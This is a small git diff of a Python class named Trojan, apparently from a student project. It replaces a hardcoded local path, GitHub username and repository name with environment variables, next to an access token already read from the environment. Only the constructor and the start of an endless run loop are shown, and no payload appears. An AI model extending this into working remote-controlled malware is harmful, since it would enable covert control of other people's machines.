@@ -12,11 +12,10 @@ load_dotenv()
 
 class Trojan:
     def __init__(self):
-        self.local_dir = "C:/Users/bernd/OneDrive - AP Hogeschool Antwerpen/School 22-23 semester 2/Python " \
-                         "Developement/python-trojan"
-        self.username = "BerrieV1"
+        self.local_dir = os.getenv("LOCAL_DIR")
+        self.username = os.getenv("GIT_USER")
         self.access_token = os.getenv("PAT")
-        self.repo = "python-trojan"
+        self.repo = os.getenv("GIT_REPO")
 
     def run(self):
         while True:
